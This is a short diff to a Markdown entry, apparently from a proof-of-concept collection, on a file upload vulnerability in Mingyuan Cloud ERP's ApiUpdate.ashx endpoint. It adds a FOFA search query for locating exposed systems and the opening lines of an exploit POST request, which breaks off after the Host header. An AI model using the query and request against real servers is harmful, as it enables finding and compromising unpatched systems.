@@ -1,4 +1,11 @@
 ## 明源云 ERP ApiUpdate.ashx 文件上传漏洞
+
+## fofa
+```
+body="hibot.js" || title="明源云ERP"
+```
+
+## poc
 ```
 POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
 Host: target.com
